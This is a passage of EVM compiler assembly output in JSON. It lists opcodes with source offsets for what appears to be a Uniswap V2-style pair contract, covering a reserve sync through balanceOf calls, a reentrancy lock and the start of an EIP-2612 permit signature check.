											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "SLOAD"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "SLOAD"
										},
										{
											"begin": 18085,
											"end": 18093,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18085,
											"end": 18093,
											"name": "SLOAD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP2"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MSTORE"
										},
										{
											"begin": 18074,
											"end": 18078,
											"name": "ADDRESS"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP3"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "ADD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MSTORE"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "SWAP5"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "DUP6"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "AND"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "SWAP5"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "SWAP1"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "SWAP4"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "AND"
										},
										{
											"begin": 17945,
											"end": 17951,
											"name": "SWAP3"
										},
										{
											"begin": 17976,
											"end": 18104,
											"name": "PUSH [tag]",
											"value": "259"
										},
										{
											"begin": 17976,
											"end": 18104,
											"name": "SWAP3"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "DUP6"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "SWAP3"
										},
										{
											"begin": 18024,
											"end": 18026,
											"name": "DUP8"
										},
										{
											"begin": 18024,
											"end": 18026,
											"name": "SWAP3"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "PUSH [tag]",
											"value": "260"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18085,
											"end": 18093,
											"name": "AND"
										},
										{
											"begin": 18085,
											"end": 18093,
											"name": "SWAP2"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "DUP6"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "SWAP2"
										},
										{
											"begin": 18040,
											"end": 18065,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18040,
											"end": 18065,
											"name": "SWAP2"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP3"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "ADD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP3"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP3"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP2"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP3"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SUB"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "ADD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP2"
										},
										{
											"begin": 17896,
											"end": 17902,
											"name": "DUP7"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "DUP1"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "GAS"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "STATICCALL"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "262"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "262"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MLOAD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "263"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "263"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "MLOAD"
										},
										{
											"begin": 18040,
											"end": 18080,
											"name": "SWAP1"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 18040,
											"end": 18084,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "AND"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "tag",
											"value": "260"
										},
										{
											"begin": 18040,
											"end": 18094,
											"name": "JUMPDEST"
										},
										{
											"begin": 17976,
											"end": 17989,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 17976,
											"end": 18104,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 17976,
											"end": 18104,
											"name": "tag",
											"value": "259"
										},
										{
											"begin": 17976,
											"end": 18104,
											"name": "JUMPDEST"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "SLOAD"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP2"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "MSTORE"
										},
										{
											"begin": 18212,
											"end": 18216,
											"name": "ADDRESS"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP3"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "ADD"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "MSTORE"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "MLOAD"
										},
										{
											"begin": 18114,
											"end": 18242,
											"name": "PUSH [tag]",
											"value": "264"
										},
										{
											"begin": 18114,
											"end": 18242,
											"name": "SWAP3"
										},
										{
											"begin": 18141,
											"end": 18148,
											"name": "DUP5"
										},
										{
											"begin": 18141,
											"end": 18148,
											"name": "SWAP3"
										},
										{
											"begin": 18162,
											"end": 18164,
											"name": "DUP8"
										},
										{
											"begin": 18162,
											"end": 18164,
											"name": "SWAP3"
										},
										{
											"begin": 18178,
											"end": 18232,
											"name": "PUSH [tag]",
											"value": "260"
										},
										{
											"begin": 18178,
											"end": 18232,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "SWAP1"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "AND"
										},
										{
											"begin": 18223,
											"end": 18231,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "DUP7"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "AND"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "SWAP2"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "SWAP2"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP3"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "ADD"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP3"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP3"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP2"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP3"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SWAP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "SUB"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "ADD"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP2"
										},
										{
											"begin": 18178,
											"end": 18203,
											"name": "DUP7"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "DUP1"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18178,
											"end": 18218,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "261"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 18114,
											"end": 18242,
											"name": "tag",
											"value": "264"
										},
										{
											"begin": 18114,
											"end": 18242,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1379,
											"end": 1380,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1368,
											"end": 1376,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "tag",
											"value": "112"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "JUMPDEST"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "AND"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "DUP2"
										},
										{
											"begin": 672,
											"end": 694,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "tag",
											"value": "114"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "JUMPDEST"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "AND"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "DUP2"
										},
										{
											"begin": 727,
											"end": 748,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "tag",
											"value": "117"
										},
										{
											"begin": 3517,
											"end": 4481,
											"name": "JUMPDEST"
										},
										{
											"begin": 3730,
											"end": 3745,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3718,
											"end": 3726,
											"name": "DUP5"
										},
										{
											"begin": 3718,
											"end": 3745,
											"name": "LT"
										},
										{
											"begin": 3718,
											"end": 3745,
											"name": "ISZERO"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH [tag]",
											"value": "270"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "JUMPI"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP2"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP3"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MSTORE"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "MLOAD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "DUP2"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SUB"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "ADD"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "SWAP1"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "REVERT"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "tag",
											"value": "270"
										},
										{
											"begin": 3710,
											"end": 3766,
											"name": "JUMPDEST"
										},
										{
											"begin": 3878,
											"end": 3894,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3878,
											"end": 3894,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP10"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "AND"
										},
										{
											"begin": 3776,
											"end": 3790,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "MSTORE"
										},
										{
											"begin": 4115,
											"end": 4121,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP2"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "MSTORE"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "DUP4"
										},
										{
											"begin": 4115,
											"end": 4128,
											"name": "KECCAK256"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SLOAD"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "DUP3"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "ADD"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP1"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SWAP3"
										},
										{
											"begin": 4115,
											"end": 4130,
											"name": "SSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP3"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 748,
											"end": 814,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP2"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP5"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP14"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "AND"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP13"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP12"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP2"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP6"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "DUP3"
										},
										{
											"begin": 3943,
											"end": 4186,
											"name": "MSTORE"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "DUP1"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "MLOAD"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "SWAP1"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "DUP4"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "ADD"
										},
										{
											"begin": 3912,
											"end": 4204,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "DUP6"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "ADD"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP1"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "SWAP7"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "MSTORE"
										},
										{
											"begin": 3816,
											"end": 4218,
											"name": "PUSH",
											"value": "122"
										},
										{
